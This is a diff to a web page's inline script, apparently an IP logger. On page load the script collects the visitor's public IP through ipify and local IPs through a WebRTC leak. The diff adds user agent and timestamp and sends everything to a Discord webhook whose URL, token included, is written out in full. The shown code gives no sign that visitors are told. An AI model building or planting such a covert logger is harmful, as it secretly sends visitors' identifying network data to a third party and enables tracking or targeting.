@@ -15,8 +15,8 @@
 </div>
 
 <script>
-// Replace with your Webhook.site URL
-const WEBHOOK_URL = "https://webhook.site/123abc45-678d-90ef-gh12-34567890abcd";
+// 1. Put your Webhook.site URL here
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1405831826639159347/99mrEbed5c_e7BzwKHiBx6_Dy1wehwjGVpZPdyEw7eEJPwZK5b5nOZH_KIy8zDALWGaS";
 
 // Send data to Webhook.site
 function logToWebhook(data) {
@@ -27,14 +27,19 @@ function logToWebhook(data) {
     }).catch(err => console.error(err));
 }
 
-// Get Public IP from ipify
+// Get Public IP
 fetch("https://api.ipify.org?format=json")
     .then(res => res.json())
     .then(data => {
-        logToWebhook({ type: "Public IP", value: data.ip });
+        logToWebhook({
+            type: "Public IP",
+            value: data.ip,
+            userAgent: navigator.userAgent,
+            time: new Date().toLocaleString()
+        });
     });
 
-// Try to get Local/Internal IP via WebRTC
+// Try Local IP via WebRTC
 async function getLocalIPs(callback) {
     const pc = new RTCPeerConnection({ iceServers: [] });
     pc.createDataChannel('');
@@ -49,9 +54,13 @@ async function getLocalIPs(callback) {
 }
 
 getLocalIPs(ip => {
-    logToWebhook({ type: "Local IP", value: ip });
+    logToWebhook({
+        type: "Local IP",
+        value: ip,
+        userAgent: navigator.userAgent,
+        time: new Date().toLocaleString()
+    });
 });
 </script>
 </body>
 </html>
-
